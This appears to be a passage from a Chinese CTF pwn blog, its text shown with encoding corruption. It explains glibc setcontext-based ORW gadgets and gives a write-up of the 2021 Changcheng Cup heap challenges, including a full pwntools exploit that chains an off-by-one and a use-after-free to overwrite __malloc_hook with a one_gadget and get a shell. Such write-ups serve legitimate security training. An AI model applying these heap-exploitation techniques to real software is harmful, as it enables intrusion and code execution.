<h3 id="ä½ç‰ˆæœ¬"><a href="#ä½ç‰ˆæœ¬" class="headerlink" title="ä½ç‰ˆæœ¬"></a>ä½ç‰ˆæœ¬</h3><p>ä¸€èˆ¬åœ¨ <code>Glibc2.29</code>ä»¥å‰çš„ <code>ORW</code>è§£é¢˜æ€è·¯å·²ç»æ¯”è¾ƒæ¸…æ™°ï¼Œä¸»è¦æ˜¯åŠ«æŒ <code>free_hook</code> æˆ–è€… <code>malloc_hook</code>å†™å…¥ <code>setcontext+53</code>å‡½æ•°ä¸­çš„ gadgetï¼Œé€šè¿‡ <code>rdi</code>ç´¢å¼•ï¼Œæ¥è®¾ç½®ç›¸å…³å¯„å­˜å™¨ï¼Œå¹¶æ‰§è¡Œæå‰å¸ƒç½®å¥½çš„ <code>ORW ROP chains</code></p>
<p>setcontext+53å¤„çš„gadgetå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]<br>&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]<br>&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]<br>&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]<br>&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]<br>&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]<br>&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]<br>&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]<br>&lt;setcontext+94&gt;:  push   rcx<br>&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]<br>&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]<br>&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]<br>&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]<br>&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]<br>&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]<br>&lt;setcontext+125&gt;: xor    eax,eax<br>&lt;setcontext+127&gt;: ret<br></code></pre></td></tr></table></figure>

<p>ç›®çš„æ˜¯è·å¾—ä¸€ä¸ªå¯æ‰§è¡Œçš„æƒé™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<code>mov rsp, [rdi+0xa0]</code>å’Œ<code>mov rcx, [rdi+0xa8]</code>ã€‚ä¿®æ”¹rspçš„å€¼å°†ä¼šæ”¹å˜æ ˆæŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å°±è·å¾—äº†æ§åˆ¶æ ˆçš„èƒ½åŠ›ï¼Œä¿®æ”¹rcxçš„å€¼åæ¥ç€æœ‰ä¸ªpushæ“ä½œå°†rcxå‹æ ˆï¼Œç„¶åæ±‡ç¼–æŒ‡ä»¤æŒ‰ç…§é¡ºåºä¼šæ‰§è¡Œä»£ç ä¸­æœ€åçš„retæ“ä½œï¼Œè€Œretå»æ‰§è¡Œçš„åœ°å€å°±æ˜¯å‹å…¥æ ˆçš„rcxå€¼ï¼Œå› æ­¤ä¿®æ”¹rcxå°±è·å¾—äº†æ§åˆ¶ç¨‹åºæµç¨‹çš„èƒ½åŠ›</p>
<p>ä½†æ˜¯ä¸ºäº†èƒ½æ‰§è¡Œåˆ°è¿™ï¼Œæˆ‘ä»¬å…ˆè¦åšçš„å°±æ˜¯åŠ«æŒfree_hookæˆ–è€…malloc_hookä¸º<code>setcontext + 53</code>çš„åœ°å€ï¼Œè·³è½¬åˆ°è¿™è¾¹æ¥æ‰§è¡Œä¸Šé¢çš„gadgetsï¼Œä½†è¿™éƒ½ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯<code>setcontext + 53</code>ä¸Šçš„ä¼ å‚è®¾ç½®ã€‚å› ä¸ºéƒ½æ˜¯å€Ÿç”¨rdiä¼ å‚ï¼Œåˆšå¥½æˆ‘ä»¬æ‰§è¡Œmallocæˆ–è€…freeç”³è¯·æˆ–æ˜¯é‡Šæ”¾å †å—æ—¶ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å †çš„åœ°å€ï¼Œæ˜¯å­˜åœ¨rdiä¸Šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é‡Šæ”¾æˆ–è€…ç”³è¯·çš„å †å—çš„åœ°å€ååˆ†å…³é”®ï¼Œåœ¨å…¶åç§»0xa0å’Œ0xa8çš„ä½ç½®åˆ†åˆ«å¡«ä¸Šæˆ‘ä»¬å­˜å‚¨orwé“¾å†…å®¹çš„åœ°å€ï¼ˆæ³¨æ„ä¸æ˜¯orwçš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤åœ°å€ï¼‰å’Œä¸€ä¸ªretæ±‡ç¼–æŒ‡ä»¤çš„åœ°å€</p>
<p>æ³¨ï¼šä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥æ˜¯orwçš„åœ°å€ï¼šå› ä¸ºæ‰§è¡Œå®Œsetcontext + 53ä¸Šçš„gadgetä¼šæ‰§è¡Œretï¼Œè€Œretæ‰§è¡Œçš„rcxæŒ‡å‘çš„åœ°å€ï¼Œå¦‚æœrcxè£…çš„æ˜¯mprotectçš„åœ°å€ï¼Œæ‰§è¡Œå®Œmprotectå°±ä¼šå»æ‰§è¡ŒrspæŒ‡å‘çš„åœ°å€ï¼Œæ³¨æ„æ˜¯åœ°å€ï¼å¦‚æœå‰é¢ç›´æ¥ä¼ å…¥rspçš„æ˜¯orwçš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆretæ‰§è¡Œçš„æ˜¯æŠŠå†™åœ¨ä¸Šé¢çš„æŒ‡ä»¤ä½œä¸ºä¸€ä¸ªåœ°å€è§£æï¼Œç›´æ¥å°±ä¼šæŠ¥é”™äº†ï¼Œå› ä¸ºripè·å–çš„æ˜¯æ ˆé¡¶çš„å€¼ï¼Œæ‰€ä»¥è¦ä¸­è½¬ä¸€ä¸‹ï¼Œå‰é¢å†™çš„æ˜¯å¦å¤–ä¸€ä¸ªåœ°å€ï¼ˆä¸€èˆ¬å°±ç›´æ¥åœ¨shellcodeå‰å…«ä¸ªå­—èŠ‚çš„åœ°æ–¹ï¼‰ï¼Œç„¶ååœ¨è¿™ä¸ªåœ°å€ä¸Šå†™å…¥çš„æ‰æ˜¯shellcodeçš„åœ°å€</p>
<p>å¯ä»¥è‡ªå·±ç®—åç§»ï¼Œä¹Ÿå¯ä»¥å€Ÿç”¨pwntoolsçš„SigreturnFrameç±»ç›´æ¥æ¥æ„é€ ã€‚æ­¤æ—¶frameä¸­çš„rspå’Œripå¯¹åº”çš„å°±æ˜¯setcontextçš„rspå’Œrcx</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">context.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-attr">frame</span> = SigreturnFrame()<br><span class="hljs-attr">frame.rsp</span> = shellcode_addr<br><span class="hljs-attr">frame.rip</span> = ret_addr<br></code></pre></td></tr></table></figure>

<p>ä¾‹é¢˜æŸ¥çœ‹æˆ‘ä¹‹å‰çš„æ¯”èµ›å¤ç°é¢˜ç›®ï¼š<code>K1ng_in_h3Ap_II</code>ï¼Œ<code>Whats your name</code></p>
<h3 id="é«˜ç‰ˆæœ¬"><a href="#é«˜ç‰ˆæœ¬" class="headerlink" title="é«˜ç‰ˆæœ¬"></a>é«˜ç‰ˆæœ¬</h3><p>ä½†åœ¨ <code>Glibc 2.29</code>ä¹‹å <code>setcontext</code>ä¸­çš„gadgetå˜æˆäº†ä»¥ <code>rdx</code>ç´¢å¼•ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æŒ‰ç…§ä¹‹å‰æ€è·¯çš„è¯ï¼Œè¿˜è¦å…ˆé€šè¿‡ <code>ROP</code>æ§åˆ¶ <code>RDX</code>çš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]<br>.text:00000000000580E4                 mov     rbx, [rdx+80h]<br>.text:00000000000580EB                 mov     rbp, [rdx+78h]<br>.text:00000000000580EF                 mov     r12, [rdx+48h]<br>.text:00000000000580F3                 mov     r13, [rdx+50h]<br>.text:00000000000580F7                 mov     r14, [rdx+58h]<br>.text:00000000000580FB                 mov     r15, [rdx+60h]<br>.text:00000000000580FF                 test    dword ptr fs:48h, 2<br>    ....<br>.text:00000000000581C6                 mov     rcx, [rdx+0A8h]<br>.text:00000000000581CD                 push    rcx<br>.text:00000000000581CE                 mov     rsi, [rdx+70h]<br>.text:00000000000581D2                 mov     rdi, [rdx+68h]<br>.text:00000000000581D6                 mov     rcx, [rdx+98h]<br>.text:00000000000581DD                 mov     r8, [rdx+28h]<br>.text:00000000000581E1                 mov     r9, [rdx+30h]<br>.text:00000000000581E5                 mov     rdx, [rdx+88h]<br>.text:00000000000581EC                 xor     eax, eax<br>.text:00000000000581EE                 retn<br></code></pre></td></tr></table></figure>

<h3 id="gadget1"><a href="#gadget1" class="headerlink" title="gadget1"></a>gadget1</h3><p>è¿™å…¶ä¸­ç”¨åˆ°çš„ <code>gadget</code>æ˜¯ <code>getkeyserv_handle+576</code>ï¼Œå…¶æ±‡ç¼–å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov     rdx, [rdi+8]<br>mov     [rsp+0C8h+var_C8], rax<br>call    qword ptr [rdx+20h]<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ª <code>gadget</code>å¯ä»¥é€šè¿‡ <code>rdi</code> æ¥æ§åˆ¶ <code>rdx</code>ï¼Œ éå¸¸å¥½ç”¨ï¼Œè€Œä¸”ä» Glibc2.29åˆ°2.32éƒ½å¯ç”¨</p>
<p>æ§åˆ¶ <code>rdx</code>ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ <code>setcontext</code>æ¥æ§åˆ¶å…¶ä»–å¯„å­˜å™¨äº†</p>
<h3 id="gadget2"><a href="#gadget2" class="headerlink" title="gadget2"></a>gadget2</h3><p>é€šè¿‡ gadgetæ§åˆ¶rbpçš„å€¼ï¼Œä»è€Œè¿›è¡Œæ ˆè¿ç§»ï¼Œå°†æ ˆåŠ«æŒåˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †åœ°å€ä¸Šï¼Œå¹¶æ‰§è¡Œé¢„å…ˆå¸ƒç½®çš„ropé“¾ï¼Œä»è€Œè·å–flag</p>
<p>å…ˆä»‹ç»ä¸€ä¸‹ä¸‡é‡‘æ²¹çš„gadget <code>svcudp_reply+26</code>ï¼Œæ±‡ç¼–å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov rbp, qword ptr [rdi + 0x48]; <br>mov rax, qword ptr [rbp + 0x18]; <br>lea r13, [rbp + 0x10]; <br>mov dword ptr [rbp + 0x10], 0; <br>mov rdi, r13; <br>call qword ptr [rax + 0x28];<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªgadgetsä¸»è¦æ˜¯é€šè¿‡ <code>rdi</code>æ§åˆ¶ <code>rbp</code>è¿›è€Œæ§åˆ¶ <code>rax</code>å¹¶æ‰§è¡Œè·³è½¬ï¼Œç”±äºæˆ‘ä»¬å·²ç»æ§åˆ¶äº† <code>rbp</code>çš„å€¼ï¼Œå› æ­¤åªéœ€è¦åœ¨ <code>rax+0x28</code>çš„ä½ç½®éƒ¨ç½² <code>leaveï¼›ret</code>å³å¯å®Œæˆæ ˆè¿ç§»</p>
<p>ä»è€Œåœ¨æˆ‘ä»¬å·²ç»å¸ƒç½®å¥½ <code>orw ropé“¾</code>çš„ä½ç½®ä¼ªé€ æ ˆåœ°å€å¹¶åŠ«æŒæ§åˆ¶æµï¼Œæœ€ç»ˆè¯»å–<code>flag</code></p>
<h3 id="gadget3"><a href="#gadget3" class="headerlink" title="gadget3"></a>gadget3</h3><p>åœ¨gadget2ä¸­æ˜¯é€šè¿‡gadgetsè¿›è¡Œæ ˆè¿ç§»ï¼Œå°†åŸæœ¬çš„æ ˆåœ°å€åŠ«æŒåˆ°äº†å †ä¸Šï¼Œä½†å¦‚æœæ ˆåœ°å€å·²çŸ¥çš„è¯ï¼Œè§£é¢˜è¿‡ç¨‹ä¼šæ›´åŠ ç®€å•ï¼Œè€Œä¸”ä¸éœ€è¦ç‰¹æ„å»å¯»æ‰¾gadgetsï¼Œé‚£ä¹ˆå¦‚ä½•æ³„éœ²æ ˆåœ°å€å‘¢ï¼Ÿå…¶å®ç¨‹åºçš„æ ˆåœ°å€ä¼šå­˜æ”¾åœ¨ <code>environ</code>ä¸­ï¼Œæˆ‘ä»¬åªè¦è¾“å‡º<code>environ</code>çš„å†…å®¹å°±èƒ½è·å–æ ˆåœ°å€</p>
<p>æ¥æºï¼š<a href="https://www.anquanke.com/post/id/236832">https://www.anquanke.com/post/id/236832</a></p>
<p>â€‹            <a href="http://blog.eonew.cn/archives/993">http://blog.eonew.cn/archives/993</a></p>
<p>â€‹            <a href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></p>
]]></content>
      <tags>
        <tag>orw</tag>
      </tags>
  </entry>
  <entry>
    <title>2021é•¿åŸæ¯PWN</title>
    <url>/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡ä¸€å…±ä¸‰é¢˜pwnï¼Œä¸¤é¢˜å…¶å®éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„å †é¢˜ï¼Œå¯æƒœåªåšå‡ºäº†ä¸€é¢˜ï¼Œè¿˜æœ‰ä¸€é¢˜å †ä¸Šçš„orwåœ¨æ¯”èµ›å‰æ²¡èƒ½å‡º ã€‚ä¸è¿‡æ€»çš„æ¥è¯´ï¼šæ¯”ä¹‹å‰è¿˜æ˜¯è¿›æ­¥äº†å¾ˆå¤šï¼ŒåŠ æ²¹</p>
<h2 id="K1ng-in-h3Ap-I"><a href="#K1ng-in-h3Ap-I" class="headerlink" title="K1ng_in_h3Ap_I"></a>K1ng_in_h3Ap_I</h2><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161053043.png" alt="image-20210921161053043"></p>
<p>æ¯«æ— ç–‘é—®çš„64ä½ï¼Œä¿æŠ¤å…¨å¼€</p>
<p>ç¨‹åºä¸€å…±æœ‰ç€ä¸‰ä¸ªåŠŸèƒ½ä»¥åŠä¸€ä¸ªå¥½å¿ƒé€æˆ‘ä»¬çš„ä¸‰å­—èŠ‚libcåœ°å€</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161202941.png" alt="image-20210921161202941"></p>
<p>è¾“å…¥666ä¼šæ‰“å°å‡ºåä¸‰å­—èŠ‚åœ°å€</p>
<p>ç”³è¯·å †å—æ²¡æœ‰ç‰¹æ®Šçš„ï¼Œåªæ˜¯ä¸èƒ½ç”³è¯·å¤§äº0xF0çš„å †å—</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161426698.png" alt="image-20210921161426698"></p>
<p>å†™å…¥åŠŸèƒ½å­˜åœ¨ç€offbyoneï¼Œè¿˜è¦æ³¨æ„çš„å°±æ˜¯äº¤äº’è¦è¾“å…¥â€™\nâ€™æ‰èƒ½ç»“æŸï¼Œå¦åˆ™å°±è¦è¾“å…¥å®Œæ‰€æœ‰é•¿åº¦æ•°æ®</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161337239.png" alt="image-20210921161337239"></p>
<p>é‡Šæ”¾åŠŸèƒ½å­˜åœ¨UAF</p>
<p>æ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯å€Ÿç€offbyoneç”Ÿæˆunsorted chunkï¼Œå¾—åˆ°libcåœ°å€ï¼Œç„¶åå†å°†ä»–åˆ†ä¸ºä¸€å—å¤§å°ä¸ºä¸º0x70çš„fast chunkï¼Œå€Ÿç”¨UAFå¯¹ç€libcåä¸‰ä½è¿›è¡Œè¦†ç›–ï¼Œè¦†ç›–æˆstdoutçš„åœ°å€ï¼Œå°†å †å—åˆ†é…åˆ°stdoutä¸Šï¼Œåå‡ºlibcåœ°å€ã€‚ç„¶åæ•…æŠ€é‡æ–½ï¼Œå†åˆ†é…åˆ°__malloc_hookä¸Šï¼Œä½†æ˜¯è¿˜è¦å€Ÿç”¨rellocè°ƒæ•´ä¸€ä¸‹æ‰è¡Œ</p>
<p>çœ‹äº†åˆ«äººçš„wpï¼Œå¯¹äºç¬¬ä¸€æ¬¡æŠŠchunkåˆ†é…åˆ°stdoutè¿˜æœ‰åˆ«çš„æ€è·¯ï¼šå…ˆé‡Šæ”¾ä¸€å—unsorted chunkï¼Œç„¶åç”³è¯·å›æ¥0x70å¤§å°çš„fast chunkï¼Œæ­¤æ—¶è¿™å—chunkä¸Šä¹Ÿæ˜¯ä¼šæ®‹ç•™ç€libcåœ°å€ï¼ˆæ­£å¸¸çš„mallocæ˜¯ä¸ä¼šæ¸…é›¶çš„ï¼‰ï¼Œç„¶åé‡Šæ”¾ä¸¤ä¸ªfast chunkè¿›å…¥biné“¾ï¼Œå°†åè¿›çš„é‚£å—ï¼Œå€Ÿç”¨UAFæŠŠfdæŒ‡é’ˆä¿®æ”¹æˆæŒ‡å‘æœ‰ç€libcåœ°å€çš„é‚£ä¸ªchunkï¼Œè¿™æ—¶ä¹Ÿèƒ½å°†å †å—ç”³è¯·åˆ°stdoutä¸Š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input context:&quot;</span>)<br>	p.sendline(content)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>) <br>log.success(<span class="hljs-built_in">hex</span>(addr))<br>stdout = (addr + <span class="hljs-number">0x36FE10</span>) &amp; <span class="hljs-number">0xFFFFFF</span><br>log.info(<span class="hljs-string">&quot;stdout==&gt;0x%x&quot;</span> %stdout)<br>low = stdout &amp; <span class="hljs-number">0xFFFF</span><br>high = (stdout &gt;&gt; <span class="hljs-number">16</span>) &amp;<span class="hljs-number">0xFF</span><br>log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>log.info(<span class="hljs-string">&quot;high==&gt;0x%x&quot;</span> %high)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">2</span>,p16(low - <span class="hljs-number">0x43</span>) + p8(high))<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span> <br>edit(<span class="hljs-number">4</span>,payload)<br>p.recv(<span class="hljs-number">0x40</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5600</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">3</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>log.info(<span class="hljs-string">&quot;__libc_realloc==&gt;0x%x&quot;</span> %realloc)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) + p64(ogg) + p64(realloc+<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">5</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="K1ng-in-h3Ap-II"><a href="#K1ng-in-h3Ap-II" class="headerlink" title="K1ng_in_h3Ap_II"></a>K1ng_in_h3Ap_II</h2><p>æ¥æºï¼š<a href="https://blog.csdn.net/eeeeeight/article/details/120386415">https://blog.csdn.net/eeeeeight/article/details/120386415</a></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921163803827.png" alt="image-20210921163803827"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€ã€‚åœ¨ç¨‹åºä¸Šè·Ÿä¸Šé¢˜æ˜¯å·®ä¸å¤šçš„ï¼Œå°‘äº†666çš„åœ°å€æ³„éœ²ä»¥åŠoffbyoneæ¼æ´ï¼Œä½†æ˜¯å¤šäº†æ‰“å°åŠŸèƒ½ï¼Œä»¥åŠlibcç‰ˆæœ¬æå‡è‡³2.27ï¼Œè‡³äº2.27ï¼Œå°±æ˜¯æ ‡å¿—æ€§çš„tcache bin</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922131449936.png" alt="image-20210922131449936"></p>
<p>ç„¶åç”³è¯·çš„sizeåªèƒ½æ˜¯åœ¨0x10~0x60</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132037509.png" alt="image-20210922132037509"></p>
<p>UAFä¾ç„¶å­˜åœ¨</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132136392.png" alt="image-20210922132136392"></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132215898.png" alt="image-20210922132215898"></p>
<p>å¤šäº†ä¸€å±‚æ²™ç®±ï¼Œçœ‹åˆ°è¿™ä¸ªåŸºæœ¬éƒ½æ˜¯orwçš„æ€è·¯ï¼šå€Ÿç”¨setcontext + 53ä¸Šçš„gadgetsï¼Œè°ƒç”¨mprotectä½¿å¾—å †å¯æ‰§è¡Œï¼Œç„¶åæ‰§è¡Œå¸ƒç½®åœ¨å †ä¸Šçš„ropé“¾ï¼Œè¯»å–flag</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132710147.png" alt="image-20210922132710147"></p>
<p>ç”³è¯·0x50çš„å †å—æ˜¯å› ä¸ºé“¾ä¸Šæ²¡æœ‰0x60çš„ç©ºé—²å †å—ï¼Œæ‰€ä»¥ç”³è¯·å‡ºæ¥çš„å †å—æ˜¯åœ¨æœ€åº•ä¸‹çš„ï¼ˆä¸top chunkç›¸è¿‘çš„ï¼‰å¹¶ä¸”ä¸¤å—æ˜¯è¿ç»­çš„ï¼Œå¥½ç®—åç§»</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133019126.png" alt="image-20210922133019126"></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133236908-16322992251781.png" alt="image-20210922133236908"></p>
<p>ç„¶åå…ˆåé‡Šæ”¾ï¼Œå€Ÿç”¨UAFæ³„éœ²å‡ºå †ä¸Šåœ°å€ï¼Œè¿›è€Œè®¡ç®—tcacheåœ°å€</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162651147.png" alt="image-20210922162651147"></p>
<p>ç„¶åæŠŠæˆ‘ä»¬ä¹‹åè¦ç”³è¯·ç”¨åˆ°çš„å †å—çš„countæ•°é‡æ”¹ä¸º2ï¼Œä»¥åŠæŠŠunsorted chunkçš„countå…¨éƒ¨ä¸€æ¬¡æ€§æ”¹ä¸º7ï¼Œä¸ºåç»­é‡Šæ”¾unsorted chunkè¿›å…¥biné“¾æ³„éœ²libcåŸºå€åšå·¥ä½œ</p>
